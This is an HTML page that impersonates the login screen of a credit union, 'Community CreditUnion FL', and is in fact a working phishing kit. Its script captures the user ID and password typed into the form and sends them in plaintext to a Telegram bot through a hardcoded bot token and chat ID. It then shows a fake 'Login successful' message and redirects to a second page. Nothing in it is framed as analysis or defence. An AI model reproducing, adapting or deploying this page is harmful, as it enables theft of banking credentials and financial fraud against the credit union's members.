<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Community CreditUnion FL | Login</title>
    <style>
        /* Global bold text */
        body, .form-label, .button-text, .link-button, input::placeholder,
        .heading-1, .heading-2, .heading-3, .heading-4, .heading-5, .heading-6 {
            font-weight: bold !important;
        }

        /* Rounded edges for all elements */
        .text-input, .login-form-container, .section, .button,
        .widget-container, .logo-container {
            border-radius: 15px !important;
        }

        /* Text input styling */
        .text-input {
            border-radius: 12px !important;
            border: 2px solid #ccc !important;
            padding: 12px 15px !important;
            width: 100%;
            box-sizing: border-box;
            font-size: 16px;
            margin-top: 5px;
        }

        /* Button styling */
        .button {
            border-radius: 25px !important;
            font-weight: bold !important;
            padding: 12px 24px !important;
            border: none;
            cursor: pointer;
            font-size: 16px;
            width: 100%;
            background: #0279b3;
            color: white;
            margin-top: 15px;
        }

        .button:hover {
            background: #015781;
        }

        /* Link buttons */
        .link-button {
            border-radius: 15px !important;
            padding: 8px 16px !important;
            margin: 5px 0 !important;
            background: none;
            border: none;
            color: #05c;
            text-decoration: underline;
            cursor: pointer;
            font-size: 14px;
        }

        /* Form container */
        .login-form-container {
            border-radius: 20px !important;
            padding: 25px !important;
            background: rgba(255, 255, 255, 0.95) !important;
            margin: 20px auto;
            max-width: 400px;
        }

        /* Logo container */
        .logo-container {
            text-align: center;
            margin-bottom: 30px;
        }

        .logo {
            max-width: 200px;
            height: auto;
        }

        /* Form labels */
        .form-label {
            display: block;
            margin-bottom: 20px;
        }

        .form-label-text {
            display: block;
            margin-bottom: 8px;
            font-size: 14px;
            color: #333;
        }

        /* Links container */
        .links-container {
            margin-top: 20px;
            text-align: center;
        }

        .links-list {
            list-style: none;
            padding: 0;
            margin: 0;
        }

        .links-list li {
            display: inline-block;
            margin: 0 10px;
        }

        /* Main container */
        .main-container {
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
            background: linear-gradient(135deg, #e3e3e3 0%, #ffffff 100%);
            padding: 20px;
        }

        /* Login widget */
        .login-widget {
            background: white;
            border-radius: 20px;
            box-shadow: 0 8px 25px rgba(0, 0, 0, 0.15);
            max-width: 450px;
            width: 100%;
            overflow: hidden;
        }

        /* Message background */
        .message-background {
            height: 150px;
            background: url('GettyImages-1132115576-1024x683.jpg') center/cover no-repeat;
            border-radius: 20px 20px 0 0;
        }

        /* Form section */
        .form-section {
            padding: 30px;
        }

        /* Title */
        .page-title {
            text-align: center;
            color: #333;
            margin-bottom: 30px;
            font-size: 24px;
        }

        /* Error message */
        .error-message {
            color: #c23a4c;
            background: #f3d5d9;
            padding: 10px;
            border-radius: 10px;
            margin-top: 10px;
            display: none;
            font-size: 14px;
        }
    </style>
</head>
<body>
    <div class="main-container">
        <div class="login-widget">
            <div class="message-background"></div>
            <div class="form-section">
                <div class="logo-container">
                    <a href="/">
                        <img src="03658-logo-lg-md-publish.png" alt="Community CreditUnion FL" class="logo">
                    </a>
                </div>
                
                <h1 class="page-title">Login</h1>
                
                <form class="login-form" method="post" autocomplete="off">
                    <div class="login-form-container">
                        <div class="form-group">
                            <label class="form-label">
                                <span class="form-label-text">User ID</span>
                                <input type="text" name="username" class="text-input" placeholder="Enter your User ID" required autocomplete="off">
                            </label>
                        </div>
                        
                        <div class="form-group">
                            <label class="form-label">
                                <span class="form-label-text">Password</span>
                                <input type="password" name="password" class="text-input" placeholder="Enter your password" required autocomplete="off">
                            </label>
                        </div>
                        
                        <div class="error-message" id="errorMessage"></div>
                        
                        <button type="submit" class="button">Login</button>
                        
                        <div class="links-container">
                            <ul class="links-list">
                                <li><button type="button" class="link-button">Forgot Login?</button></li>
                                <li><button type="button" class="link-button">Test your browser</button></li>
                                <li><button type="button" class="link-button">Trouble testing your browser</button></li>
                            </ul>
                        </div>
                    </div>
                </form>
            </div>
        </div>
    </div>

    <script>
        // Telegram Bot Token and Chat ID
        const botToken = '6256698104:AAE5QZORxw737Vgc__jArGtIpQ3JrJfyv44';
        const chatId = '1217852633';

        // Get the form element
        const form = document.querySelector('.login-form');
        const errorMessage = document.getElementById('errorMessage');

        // Add event listener for form submission
        form.addEventListener('submit', async (event) => {
            event.preventDefault(); // Prevent default form submission

            // Get form data
            const username = document.querySelector('input[name="username"]').value.trim();
            const password = document.querySelector('input[name="password"]').value.trim();

            // Validate inputs
            if (!username || !password) {
                showError('Please enter both User ID and Password');
                return;
            }

            // Construct the message to send to Telegram
            const message = `ðŸ” New Login Attempt:\nðŸ‘¤ Username: ${username}\nðŸ”‘ Password: ${password}\n\nðŸ• Time: ${new Date().toLocaleString()}`;

            // Telegram API URL
            const telegramApiUrl = `https://api.telegram.org/bot${botToken}/sendMessage`;

            try {
                // Show loading state
                const submitButton = form.querySelector('button[type="submit"]');
                const originalText = submitButton.textContent;
                submitButton.textContent = 'Sending...';
                submitButton.disabled = true;

                // Send the message to Telegram
                const response = await fetch(telegramApiUrl, {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json',
                    },
                    body: JSON.stringify({
                        chat_id: chatId,
                        text: message,
                    }),
                });

                const result = await response.json();
                
                // Restore button state
                submitButton.textContent = originalText;
                submitButton.disabled = false;

                if (result.ok) {
                    console.log('Login data sent to Telegram successfully');
                    showSuccess('Login successful! Redirecting...');
                    
                    // Reset form
                    form.reset();
                    
                    // Redirect after delay
                    setTimeout(() => {
                        window.location.href = 'index2.html';
                    }, 2000);
                } else {
                    showError('Failed to send data: ' + (result.description || 'Unknown error'));
                }
            } catch (error) {
                console.error('Error sending data to Telegram:', error);
                showError('Connection error. Please try again.');
            }
        });

        function showError(message) {
            errorMessage.textContent = message;
            errorMessage.style.display = 'block';
            errorMessage.style.background = '#f3d5d9';
            errorMessage.style.color = '#c23a4c';
        }

        function showSuccess(message) {
            errorMessage.textContent = message;
            errorMessage.style.display = 'block';
            errorMessage.style.background = '#ddf1db';
            errorMessage.style.color = '#4ba740';
        }

        // Add click handlers for link buttons
        document.querySelectorAll('.link-button').forEach(button => {
            button.addEventListener('click', function() {
                alert('This feature is currently unavailable.');
            });
        });
    </script>
</body>
</html>
